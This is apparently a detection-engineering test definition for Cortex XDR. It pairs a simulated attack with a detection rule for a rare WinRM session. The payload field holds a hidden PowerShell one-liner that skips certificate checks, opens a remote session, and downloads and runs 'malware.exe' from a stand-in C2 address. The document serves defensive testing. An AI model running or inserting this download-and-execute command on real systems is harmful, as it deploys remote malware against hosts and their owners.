identity.name: WinRM Session via PowerShell with C2 Communication
identity.summary: An attacker uses PowerShell to initiate a WinRM session and establish C2 communication via TEST-NET-1. Cortex should detect the rare WinRM session and associated network behavior.
identity.description: An attacker uses PowerShell to initiate a WinRM session and establish C2 communication via TEST-NET-1. Cortex should detect the rare WinRM session and associated network behavior.

payload.code: powershell -w hidden -c "$s = New-Object System.Management.Automation.PSSessionOption -Property @{SkipCACheck = $true; SkipCNCheck = $true}; Invoke-Command -ComputerName '192.0.2.10' -Credential (Get-Credential) -SessionOption $s -ScriptBlock { Invoke-WebRequest -Uri 'http://192.0.2.50:8080/payload' -OutFile 'C:\temp\malware.exe'; Start-Process 'C:\temp\malware.exe' };"

expected_artifacts.description: Outbound connection to TEST-NET-1 C2 server

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare WinRM Session
biocs.description: Unusual PowerShell process initiating WinRM session to non-standard host
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name = 'powershell.exe'
| filter causality_actor_process_image_name = 'powershell.exe'
| filter action_file_path contains 'WinRM'
| filter dst_ip = '192.0.2.10'
